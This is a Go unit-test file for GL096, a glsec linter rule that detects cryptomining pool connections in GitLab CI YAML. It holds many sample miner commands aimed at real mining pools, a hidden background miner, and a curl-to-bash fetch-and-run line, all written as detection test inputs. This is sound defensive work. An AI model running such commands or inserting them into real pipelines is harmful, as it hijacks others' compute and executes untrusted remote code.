// Copyright The glsec Authors
// SPDX-License-Identifier: Apache-2.0

package rules

import (
	"strings"
	"testing"

	"github.com/glsec/glsec/internal/finding"
	"github.com/glsec/glsec/internal/parser"
)

func findings096(t *testing.T, yaml string) []finding.Finding {
	t.Helper()
	doc, err := parser.Parse([]byte(yaml), "test.yml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	return GL096.Check(doc.Root, "test.yml")
}

// script096 puts line in a single-quoted YAML scalar, so a colon in a host:port
// does not make YAML read the script line as a mapping.
func script096(line string) string {
	return "j:\n  script:\n    - '" + strings.ReplaceAll(line, "'", "''") + "'\n"
}

// A Stratum URL or a known pool host in a command is a pool connection: error.
func TestGL096_PoolConnectionIsError(t *testing.T) {
	for line, trigger := range map[string]string{
		`xmrig -o stratum+tcp://pool.supportxmr.com:3333 -u WALLET`:                   "stratum+tcp://pool.supportxmr.com:3333",
		`./cpuminer -a yespower -o stratum+ssl://example-pool.invalid:4443 -u w`:      "stratum+ssl://example-pool.invalid:4443",
		`miner --url STRATUM+TLS://203.0.113.7:443`:                                   "STRATUM+TLS://203.0.113.7:443",
		`xmrig -o gulf.moneroocean.stream:10128 -u WALLET`:                            "gulf.moneroocean.stream",
		`xmrig --url=pool.hashvault.pro:443 --tls`:                                    "pool.hashvault.pro",
		`./xmrig -o auto.c3pool.org:19999 -u W -p ci`:                                 "auto.c3pool.org",
		`nohup ./xmrig -o xmr-eu1.nanopool.org:14433 -u W > /dev/null 2>&1 &`:         "xmr-eu1.nanopool.org",
		`t-rex -a kawpow -o rvn.2miners.com:6060 -u W`:                                "rvn.2miners.com",
		`./xmrig -o rx.unmineable.com:3333 -a rx -u DOGE:W`:                           "rx.unmineable.com",
		`./xmrig -o de.monero.herominers.com:1111`:                                    "de.monero.herominers.com",
		`./xmrig -o minexmr.com:4444`:                                                 "minexmr.com",
		`./xmrig -o "pool.SupportXMR.com:443"`:                                        "pool.SupportXMR.com",
		`make && ./xmrig -o pool.supportxmr.com:443`:                                  "pool.supportxmr.com",
		`curl -s https://example.invalid/m.sh | bash -s -- stratum+tcp://p.invalid:1`: "stratum+tcp://p.invalid:1",
	} {
		t.Run(line, func(t *testing.T) {
			f := findings096(t, script096(line))
			if len(f) != 1 {
				t.Fatalf("expected one GL096 finding for %q, got %d: %+v", line, len(f), f)
			}
			if f[0].Severity != finding.Error || f[0].RuleID != "GL096" || f[0].Job != "j" {
				t.Errorf("unexpected finding %+v", f[0])
			}
			if !strings.Contains(f[0].Message, "("+trigger+")") || !strings.Contains(f[0].Message, "cryptojacking") {
				t.Errorf("message does not name %q: %s", trigger, f[0].Message)
			}
			if f[0].Line != 3 {
				t.Errorf("line %d, want 3", f[0].Line)
			}
		})
	}
}

// Building, cloning or imaging a miner is not mining; the bare tool name, a pool
// URL that is only printed, lookalike domains and comments stay silent.
func TestGL096_NotAPoolConnection(t *testing.T) {
	for _, line := range []string{
		`git clone --recursive https://github.com/xmrig/xmrig.git && cd xmrig && mkdir build && cd build && cmake .. && make -j$(nproc)`,
		`docker pull strm/xmrig`,
		`git clone https://github.com/MoneroOcean/xmrig.git`,
		`./xmrig --version`,
		`cpuminer --help`,
		`echo "never point a miner at stratum+tcp://pool.supportxmr.com:3333"`,
		`printf "%s\n" gulf.moneroocean.stream`,
		`curl https://notsupportxmr.com/`,
		`curl https://supportxmr.com.example.org/`,
		`curl https://supportxmr.company/`,
		`curl https://nanopool.org-mirror.example/`,
		`stratum --help`,
		`echo ok # xmrig -o stratum+tcp://pool.supportxmr.com:3333`,
	} {
		t.Run(line, func(t *testing.T) {
			if f := findings096(t, script096(line)); len(f) != 0 {
				t.Errorf("expected no GL096 finding for %q, got %+v", line, f)
			}
		})
	}
}

// The image reference from the issue's false-positive class, and a variable
// that holds a pool host but is never run, are not script commands.
func TestGL096_ImageAndVariablesAreNotScripts(t *testing.T) {
	yaml := "variables:\n  PUBLIC_IMAGE: 'strm/xmrig'\n  POOL: 'pool.supportxmr.com:3333'\nbuild:\n  image: strm/xmrig\n  script:\n    - make\n"
	if f := findings096(t, yaml); len(f) != 0 {
		t.Errorf("expected no GL096 finding, got %+v", f)
	}
}

// In a `|` block the finding points at the line of the pool connection.
func TestGL096_BlockScalarLine(t *testing.T) {
	yaml := "j:\n  script:\n    - |\n      make\n      ./xmrig -o pool.supportxmr.com:443\n"
	f := findings096(t, yaml)
	if len(f) != 1 || f[0].Line != 5 {
		t.Fatalf("expected one finding on line 5, got %+v", f)
	}
}

// Every script surface is read: before_script, after_script and default:.
func TestGL096_EveryScriptSurface(t *testing.T) {
	yaml := "default:\n  before_script:\n    - 'xmrig -o stratum+tcp://p.invalid:1'\nj:\n  after_script:\n    - 'xmrig -o pool.supportxmr.com:443'\n  script:\n    - make\n"
	if f := findings096(t, yaml); len(f) != 2 {
		t.Errorf("expected 2 GL096 findings, got %d: %+v", len(f), f)
	}
}
